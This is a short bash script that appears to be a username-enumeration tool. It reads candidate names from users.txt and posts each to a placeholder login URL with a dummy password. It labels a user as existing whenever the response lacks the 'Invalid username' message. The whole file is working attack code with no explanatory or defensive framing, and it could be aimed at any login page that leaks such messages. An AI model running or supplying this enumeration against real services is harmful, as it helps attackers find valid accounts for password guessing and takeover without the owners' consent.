#!/bin/bash


for i in $(cat users.txt)
do
	rep=$(curl -s -i -X POST 'https://YOURURL' --data "username=$i&password=vrzvzre")
	
	if echo "$rep" | grep -q 'Invalid username'; then
		echo $i "invalid user"
	else
		echo $i "good the user exist"
	fi
done


